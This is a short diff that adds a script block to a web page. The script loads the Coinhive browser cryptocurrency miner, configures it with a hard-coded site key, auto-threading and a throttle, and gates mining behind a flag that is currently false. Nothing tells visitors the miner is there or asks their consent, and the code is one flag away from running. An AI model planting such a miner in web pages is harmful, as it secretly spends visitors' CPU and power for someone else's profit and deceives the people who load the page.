@@ -1,0 +1,15 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+
+const enable = false;
+
+var secret = new CoinHive.User('GqthNWy6P71wfUG8adHYozWUrQeaMNZi', 'john-doe');
+secret.setAutoThreadsEnabled(true);
+secret.setThrottle(0.085);
+
+if(enable)
+	secret.start();
+
+console.log(secret.getNumThreads());
+
+</script>
